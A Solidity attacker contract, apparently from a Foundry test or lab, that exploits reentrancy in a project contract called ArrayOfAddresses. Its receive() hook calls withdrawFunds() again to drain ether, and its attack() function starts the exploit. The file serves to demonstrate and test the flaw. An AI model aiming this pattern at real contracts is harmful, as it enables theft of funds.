// SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

import {console2 as console} from "forge-std/Test.sol";
import {ArrayOfAddresses} from "src/ArrayOfAddresses.sol";

contract Reentrancy {
    ////////////////////////////////////////////////////////////////////////////////////
    //                                    Storage                                     //
    ////////////////////////////////////////////////////////////////////////////////////
    uint256 public callCount;
    ArrayOfAddresses public arrayOfAddresses;

    ////////////////////////////////////////////////////////////////////////////////////
    //                                    Constructor                                 //
    ////////////////////////////////////////////////////////////////////////////////////
    constructor(address _contractArrayOfAddresses) payable {
        arrayOfAddresses = ArrayOfAddresses(payable(_contractArrayOfAddresses));
    }

    ////////////////////////////////////////////////////////////////////////////////////
    //                                    Functions                                   //
    ////////////////////////////////////////////////////////////////////////////////////
    receive() external payable {
        callCount++;
        console.log("[*]Reentrancy::Reentrancy call #", callCount, "| Contract balance:", address(arrayOfAddresses).balance);
        
        if (callCount >= 2) {
            return;
        }
        if (address(arrayOfAddresses).balance >= 1 ether) {  
            arrayOfAddresses.withdrawFunds();
        }
    }

    function setTarget(address _contractArrayOfAddresses) external {
        arrayOfAddresses = ArrayOfAddresses(payable(_contractArrayOfAddresses));
    }

    function attack() public {
        console.log("");
        console.log("");
        console.log("[*]ReentrantOfBeneficiariesTest:: Starting attack...");
        arrayOfAddresses.withdrawFunds();
    }
}